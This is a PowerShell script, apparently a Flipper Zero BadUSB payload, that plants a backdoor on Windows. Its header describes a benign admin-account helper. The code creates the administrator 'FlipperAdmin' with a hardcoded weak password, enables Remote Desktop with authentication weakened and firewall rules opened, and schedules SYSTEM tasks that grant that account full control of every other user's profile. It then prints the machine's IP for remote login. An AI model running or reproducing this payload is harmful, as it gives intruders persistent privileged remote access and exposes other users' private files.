##################################################################################################################################################################
##################################################################################################################################################################
<#
                 _..--+~/@-~--.
             _-=~      (  .   "}
          _-~     _.--=.\ \""""
        _~      _-       \ \_\
       =      _=          '--'
      '      =                             .
     :      :       ____                   '=_. ___
___  |      ;                            ____ '~--.~.
     ;      ;                               _____  } |
  ___=       \ ___ __     __..-...__           ___/__/__
     :        =_     _.-~~          ~~--.__
_____ \         ~-+-~                   ___~=_______
     ~@#~~ == ...______ __ ___ _--~~--_
                                                    =
██████╗ ███████╗ █████╗ ███╗   ██╗ ██████╗██╗  ██╗███████╗███████╗ ██████╗ ██╗ ██████╗ █████╗ 
██╔══██╗██╔════╝██╔══██╗████╗  ██║██╔════╝██║  ██║██╔════╝╚══███╔╝██╔════╝███║██╔════╝██╔══██╗
██████╔╝███████╗███████║██╔██╗ ██║██║     ███████║█████╗    ███╔╝ ██║     ╚██║███████╗╚██████║
██╔══██╗╚════██║██╔══██║██║╚██╗██║██║     ██╔══██║██╔══╝   ███╔╝  ██║      ██║██╔═══██╗╚═══██║
██║  ██║███████║██║  ██║██║ ╚████║╚██████╗██║  ██║███████╗███████╗╚██████╗ ██║╚██████╔╝█████╔╝
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝ ╚═════╝ ╚═╝ ╚═════╝ ╚════╝ 
Script Version: 1
OS Version Script was written on: Microsoft Windows 11 Pro : 10.0.25100 Build 26100
PSVersion 5.1.26100.2161 : PSEdition Desktop : Build Version 10.0.26100.2161
Flipper Zero FirmWare mntm-001 https://momentum-fw.dev/update/
Description of Script: The New-AdminAccount function is a PowerShell script designed to create a new local administrator account on a Windows machine. 
The function prompts the user to enter a password for the new account, adds the new account to the Administrators group, and grants the new admin account full control over the files and folders of existing user profiles for administrative purposes.
When executed, the function will:
Prompt the user to enter a password for the new admin account.
Create a new admin account with the specified username and entered password.
Add the new account to the Administrators group.
Grant full control of other user profiles' files and folders to the new admin account.
#>
##################################################################################################################################################################
#==============================Beginning==========================================================================================================================
##################################################################################################################################################################
function New-AdminAccount {
    param (
        [string]$username,
        [string]$fullName = "New Admin User",
        [string]$description = "Local Administrator Account"
    )

    # Set the password to a fixed value
    $securePassword = ConvertTo-SecureString "123456789" -AsPlainText -Force

    # Create the new local user account
    New-LocalUser -Name $username -Password $securePassword -FullName $fullName -Description $description

    # Add the new user to the Administrators group
    Add-LocalGroupMember -Group "Administrators" -Member $username
    Write-Output "Admin account '$username' created and added to the Administrators group."

    # Ensure the "Remote Desktop Users" group exists and add the new user to it
    if (Get-LocalGroup -Name "Remote Desktop Users" -ErrorAction SilentlyContinue) {
        Add-LocalGroupMember -Group "Remote Desktop Users" -Member $username
        Write-Output "Admin account '$username' added to the Remote Desktop Users group."
    } else {
        Write-Output "The 'Remote Desktop Users' group was not found."
    }

    # Enable Remote Desktop
    Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
    Write-Output "Remote Desktop has been enabled."

    # Allow Remote Desktop through the firewall
    Get-NetFirewallRule -DisplayName "Remote Desktop - User Mode (TCP-In)" | Set-NetFirewallRule -Enabled True
    Get-NetFirewallRule -DisplayName "Remote Desktop - User Mode (UDP-In)" | Set-NetFirewallRule -Enabled True
    Write-Output "Remote Desktop has been allowed through the firewall."

    # Ensure Remote Desktop Services is running
    Set-Service -Name "TermService" -StartupType Automatic
    Start-Service -Name "TermService"
    Write-Output "Remote Desktop Services is running."

    # Ensure RDP is enabled in the system settings
    $RDPSettings = Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp'
    if ($RDPSettings.UserAuthentication -ne 0) {
        Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name 'UserAuthentication' -Value 0
        Write-Output "User Authentication has been disabled for Remote Desktop."
    }

    # Share other users' files and folders with the new admin account using a scheduled task
    $usersPath = "C:\Users"
    $users = Get-ChildItem -Path $usersPath | Where-Object { $_.PSIsContainer -and $_.Name -ne $username -and $_.Name -ne "Public" }

    foreach ($user in $users) {
        $userProfilePath = Join-Path -Path $usersPath -ChildPath $user.Name

        # Create a scheduled task to run icacls.exe with elevated permissions
        $action = New-ScheduledTaskAction -Execute "C:\Windows\System32\icacls.exe" -Argument "`"$userProfilePath`" /grant `"$username`":(OI)(CI)F"
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -TaskName "GrantPermissionsTask_$($user.Name)"
        Write-Output "Scheduled task created to grant full control of $userProfilePath to $username."
    }

    Write-Output "Files and folders of other users have been scheduled to be shared with the new admin account '$username'."

    # Output the computer name and IP address for remote access
    $computerName = (Get-WmiObject -Class Win32_ComputerSystem).Name
    $ipAddress = (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq "IPv4" -and $_.IPAddress -ne "127.0.0.1" }).IPAddress
    Write-Output "The computer name is '$computerName'. The IP address is '$ipAddress'. Use this name or IP address to remotely access this computer."
}

# Example usage
New-AdminAccount -username "FlipperAdmin"
##################################################################################################################################################################
#==============================End================================================================================================================================
##################################################################################################################################################################
